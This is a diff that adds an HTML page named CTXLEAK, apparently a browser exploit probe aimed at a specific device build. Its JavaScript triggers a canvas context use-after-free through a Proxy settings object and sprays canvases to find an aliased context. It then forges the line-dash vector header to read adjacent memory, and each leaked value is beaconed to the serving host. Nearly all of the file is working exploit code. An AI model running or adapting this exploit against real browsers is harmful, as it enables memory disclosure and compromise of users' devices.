@@ -1,0 +1,65 @@
+<!-- DASHVEH forge probe (portable), device-proven read-what-where on 14.10 Guide (cobrajet bench). -->
+<!-- setLineDash forges the dash Vector header -> getLineDash() reads [target]. Beacon: /beacon/CTXO-<TAG>?d=<hex>. -->
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>CTXLEAK</title></head><body>
+<div id="out" style="font:14px monospace;white-space:pre;color:#8fd0ff"></div>
+<script>
+// CTXLEAK v6: alias -> dash-vector header hunt.
+// (a) property slots may expose the dash vector's raw ptr (leak),
+// (b) writes to float slots may land in vector size/cap -> getLineDash overread (adjacent data).
+var MARKER = 7777.77, PROBE = 1717.17;
+function beacon(t,d){try{var x=new XMLHttpRequest();x.open('GET','/beacon/CTXO-'+t+'?d='+encodeURIComponent(d||'')+'&t='+Date.now(),false);x.send(null);}catch(e){}}
+function f2hex(x){var b=new ArrayBuffer(8);new Float64Array(b)[0]=x;var u=new Uint32Array(b);
+  return ('00000000'+u[1].toString(16)).slice(-8)+('00000000'+u[0].toString(16)).slice(-8);}
+function triggerUAF(){
+  var u={},fired=false,via=null;
+  try{
+    var c=document.createElement('canvas');
+    var settings=new Proxy({},{get:function(t,prop){
+      if(!fired){fired=true;via=String(prop);u.ctx=c.getContext('2d');}
+      return undefined;}});
+    u.outer=c.getContext('2d',settings);
+    u.via=via;
+  }catch(e){u.e=String(e);}
+  return u;
+}
+beacon('BOOT','v6.1');
+var u=triggerUAF();
+var d=u.ctx;
+if(d){
+  var V=[],CV=[];
+  for(var i=0;i<300;i++){
+    var cv=document.createElement('canvas');cv.width=10+i;cv.height=20;
+    var v=cv.getContext('2d');v.lineWidth=MARKER;
+    V.push(v);CV.push(cv);
+  }
+  var alias=-1;
+  try{
+    if(d.lineWidth===MARKER){d.lineWidth=PROBE;
+      for(var i=0;i<V.length;i++){if(V[i].lineWidth===PROBE){alias=i;break;}}}
+  }catch(e){beacon('PRE-ERR',e.message);}
+  beacon('ALIAS','idx='+alias);
+  if(alias>=0){
+    try{d.setLineDash([777.75,888.75]);}catch(e){beacon('SETDASH-ERR',e.message);}
+    var props=['lineWidth','miterLimit','globalAlpha','shadowBlur','shadowOffsetX','shadowOffsetY','lineDashOffset','filter','font'];
+    var out=[];
+    for(var p=0;p<props.length;p++){
+      try{out.push((p+1)+'='+f2hex(d[props[p]]));}catch(e){out.push('?');}
+    }
+    beacon('SLOTS2',out.join('|'));
+    try{var g0=V[alias].getLineDash();beacon('GD2','n='+g0.length+'|a0='+(g0[0]!==undefined?f2hex(g0[0]):'-'));}catch(e){}
+    var targets=['lineDashOffset','shadowBlur','shadowOffsetX','shadowOffsetY','miterLimit','globalAlpha'];
+    for(var w=0;w<targets.length;w++){
+      try{
+        d[targets[w]]=1717.0;
+        var gd=V[alias].getLineDash();
+        beacon('W'+w,'t='+targets[w][0]+'|len='+gd.length+'|a0='+(gd[0]!==undefined?f2hex(gd[0]):'-'));
+      }catch(e){beacon('W'+w,'X:'+e.message);}
+      try{d[targets[w]]=0;}catch(e){}
+    }
+    beacon('FINAL','done');
+  }
+}else{beacon('NODEAD','');}
+beacon('DONE','');
+location.href='/battery.html';
+</script></body></html>
